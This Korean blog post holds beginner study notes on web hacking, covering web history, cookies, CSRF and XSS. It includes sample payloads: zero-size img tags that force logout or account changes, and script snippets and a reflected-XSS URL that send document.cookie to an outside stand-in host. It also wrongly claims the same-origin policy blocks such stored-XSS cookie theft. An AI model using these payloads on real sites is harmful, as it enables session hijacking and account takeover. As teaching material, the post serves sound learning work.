---
layout: post
title: 3주차 - 웹 해킹 기초(1)
summary: 테스트
permalink: /:categories/:title
date: '2024-10-15 20:11:42'
category: dlc
---

* 드림핵의 [웹 해킹 로드맵](https://dreamhack.io/lecture/roadmaps/1)을 정리한 글입니다.

---

# 웹

* 인터넷을 기반으로 구현된 서비스 중 HTTP를 이용하여 정보를 공유하는 서비스를 웹이라 합니다.

1990년, 유럽 입자 물리 연구소(CERN)의 과학자이자 WWW(World Wide Web)의 아버지인 팀 버너스리에 의해 [우주 최초의 웹 페이지](https://info.cern.ch/)가 제작되었습니다.
페이지는 버너스리 소유의 PC(NeXT사의)로 호스팅되었습니다. 서비스 중단을 두려워했던 버너스리는 PC에 다음과 같은 라벨을 빨간 잉크로 수기해 붙였다고 합니다.[^1]
> <span style="color:red"> This machine is a server. DO NOT POWER IT DOWN!! </span>

현재는 스위스 제네바에 위치한 CERN 서버에서 호스팅되고 있습니다. (188.184.67.127)

우리가 흔히 Web 1.0이라고 부르는 시대의 페이지들은 대체로 위의 것 만큼은 아니지만, 엄청나게 단출하여 필요한 정보만이 한눈에 들어오도록 제작되었습니다. 사실 인터넷에 접속 가능한 어디서든 읽을 수 있는 전자신문이라고 부르는 편이 나았을지도 모르겠습니다. 그 흔한 RSS조차도 Web 2.0 시대에 들어서 만들어졌다고 하니까요.

Web 2.0 시대에 들어서는, 우리가 익히 알고 있는 형태의 웹 서비스들이 많이 등장하기 시작했습니다. 블로그(댓글을 작성할 수 있는), 웹 메일, 검색 엔진들이 속속들이 등장하기 시작했습니다. 21세기 이후에 등장해 우리가 지금까지도 사용하고 있는 대부분의 웹 서비스들이 여기에 해당합니다. Google이 1998년에 처음으로 크롤링을 시작했다고 하니 시기상 얼추 들어맞는 것 같습니다.[^2]

현대 웹의 가장 큰 특징은 웹이 단순히 정보를 전달하는 것(읽기)만이 아닌, 사용자가 웹에 정보를 게시할 수 있다는 것(쓰기)입니다. 취약점은 여기서 발생합니다.

웹을 구성하는 대표적인 삼요소인 HTML, CSS, JS는 모두 대체로 비교적 배우기 쉽고 개발 속도가 빠르며 특히 이식성이 아주 뛰어나다는 큰 장점이 있으나, 성능이 나쁘고 그 자체로 구조적인 취약점을 가지고 있다는 단점이 있습니다.

---

# 쿠키

현대의 웹 서비스들은 맞춤화된 사용자 경험을 제공하기 위해 노력하고 있습니다. 구글의 에드센스가 대표적인 예입니다. 하지만 이상합니다. 구글은 어떻게 구글 계정에 로그인 조차 하지 않은 저를 특정해서 맞춤형 광고를 제공할 수 있었을까요?

![](/assets/img/CSRF_Cookie.png)
*Google.com에 접속하면 전송되는 요청 헤더 목록의 일부*

구글이 **쿠키**를 이용하여 자사 서비스를 웹 브라우저로 이용하는 모든 이용자를 추적하기 때문입니다.
비단 구글 에드센스만이 아닌, 대부분의 웹 서비스들에서 로그인된 사용자의 세션을 검증하고, 자동 로그인 기능을 구현하기 위해 쿠키를 사용합니다. 헤더로부터 회원을 특정할 수 있는 정보가 그다지 많지 않을뿐더러, IP나 UA는 이용자가 다른 브라우저를 사용하거나, 통신사 모뎀을 껐다 키거나, 셀룰러 데이터를 사용하는 등 여러가지 이유로 변경될 수 있습니다. 심지어는 다른 사용자와 동일할 수도 있으니 신원을 확인하는 용도로 유용하기엔 부적절합니다.

게다가 쿠키를 통해 신원확인 이외에도 광고 팝업의 "7일 동안 보지 않기", "다시는 보지 않기" 옵션을 기록할 수도 있습니다. 비휘발성 저장소로써의 역할이란 역할은 모조리 대신할 수 있습니다. 쿠키에는 명확히 정해진 형식이 없습니다. 간단히 Key=Value 형태의 NoSQL 데이터베이스라고 이해해도 좋겠습니다. 인증 정보는 주로 SESSION이라는 이름의 Key에 보관합니다.

---

# 교차 사이트 요청 위조(Cross Site Request Forgery, CSRF)

하지만, 이렇게나 편리한 만능 저장소인 쿠키도 사소한 문제를 가지고 있습니다. 모든 인증 절차를 쿠키의 SESSION 값을 확인하는 것으로 퉁친다는 것인데요.
이러한 방식은 구현하기에도 편리하고 부하도 적어 이상적으로 완벽해보입니다. 하지만 실증세계에선 그다지 안전하지 못합니다. 왜 그럴까요?

보통은 피싱 및 그래빙의 위험 때문이지만, CSRF와 XSS 공격의 위험성 역시 존재하기 때문입니다.
이미지를 불러오는 img 태그를 사용하거나 웹 페이지에 입력된 양식을 전송하는 form 태그를 사용하는 방법이 있습니다. 이 두 개의 태그를 사용해 HTTP 요청을 보내면 Cookie 헤더에 이용자의 인증 정보가 포함되기 때문에 악용될 소지가 있습니다.

만약 제가 아래와 같이 URL의 파라미터를 악의적인 동작을 실행하도록 작성한 태그를 게시글에 포함시켜 게시한다면...

```html
<img src='http://jedo1400.github.io/logout' width=0px height=0px>
```

물론 제 블로그에는 로그인/로그아웃 기능이 구현되어있지 않지만, 존재했다면, 아마도 게시글을 열람하는 모든 이용자를 로그아웃 시켜버릴 수 있었을 것입니다.
우스워보일 수 있으나, 이 블로그가 아닌 은행 사이트에서 이런 공격이 더 심각한 형태로 이뤄진다고 상상해본다면 꽤 무서운 일입니다.

실제 오픈마켓 '옥션'에서도 이와 같은 일이 있었습니다. 중국인 해커가 사내 메일로 이러한 형태의 악성 CSRF 페이로드가 담긴 이메일을 관리자들에게 대량 전송한 것입니다.

```html
<img src="http://auction.com/changeUserAccount?id=admin&password=admin" width="0" height="0"/>
```

관리자가 메일을 읽어들이는 순간, 보이지 않는 너비 0, 높이 0의 이미지 태그는 관리자 계정의 아이디와 비밀번호를 변경하는 요청을 전송했고, 이용자 1860만명의 개인정보가 탈취당한 사상 초유의 개인 정보 유출 사건이었습니다.[^3]
잘 알려지고 쉬운 기법이라고 해서 그것이 '약한 공격'을 의미하는 것은 아닙니다. 단지 고전적일 뿐이며 언제 어느 서비스에서 발생하더라도 이상하지 않습니다.

무시무시한 CSRF 공격을 방지하기 위해서는 초나 분 단위로 생성되는 CSRF 방지 토큰 헤더를 만들고, 검증하여 실제로 현재 요청이 올바른지를 검사하면 됩니다. CSRF 기법만으로는 요청 헤더를 위변조할 방법이 없기 때문입니다.

---

# 교차 사이트 스크립팅(Cross Site Scripting, XSS)

XSS는 CSRF보다도 훨씬 더 치밀하고 위협적인 악성 페이로드를 구성할 수 있습니다.
말 그대로 자바스크립트를 통해 구현할 수 있는 모든 것을 할 수 있습니다.
```js
<script>
new Image().src = "http://jedo1400.github.io/" + document.cookie;
</script>
```

악성 스크립트의 링크가 삽입된 콘텐츠를 업로드시킨 뒤, 이용자가 해당 악성 페이지를 불러오게 되면 브라우저가 해당 코드를 실행시켜 쿠키를 전송시키는 방식으로 응용할 수 있습니다. 이러한 방식의 XSS 공격을 *Stored XSS*로 분류합니다. 하지만 이러한 류의 공격은 대부분의 브라우저에 존재하는 단의 동일-출처 정책(Same-Origin Policy, SOP)에 의해 차단됩니다.

다른 방식으로는, 서버가 악성 스크립트를 포함시켜 응답하도록 만들어 스크립트의 출처를 속이는 것입니다. 원리는 간단합니다.
이 블로그에 게시글 검색 기능이 있다고 가정해보겠습니다. 사용자는 검색어를 search 파라미터에 적어 GET요청하기만 하면 해당 검색어가 제목, 내용에 포함된 게시글 목록이 출력되는 기능입니다.
```
https://jedo1400.github.io/?search=test
```

편의를 위해, 검색 결과 페이지에선 사용자가 입력한 검색어를 입력한 그대로 최상단에 보여준다고 가정해보겠습니다.
그럼 공격자는 아래 URL로 다른 이용자가 접속하도록 유도하기만 하면 됩니다.

```
https://jedo1400.github.io/?search=<script>new Image().src = "http://cookie.grabber/" + document.cookie;</script>
```

또는 Click Jacking, Open Redirect 등 다른 취약점들과 연계하여 제로 클릭 공격으로써 응용할 수 있습니다.

---

<!-- 각주 -->
[^1]: [https://home.cern/science/computing/birth-web/short-history-web](https://home.cern/science/computing/birth-web/short-history-web)
[^2]: [https://about.google/our-story/](https://about.google/our-story/)
[^3]: [https://biz.chosun.com/site/data/html_dir/2008/04/17/2008041700945.html](https://biz.chosun.com/site/data/html_dir/2008/04/17/2008041700945.html)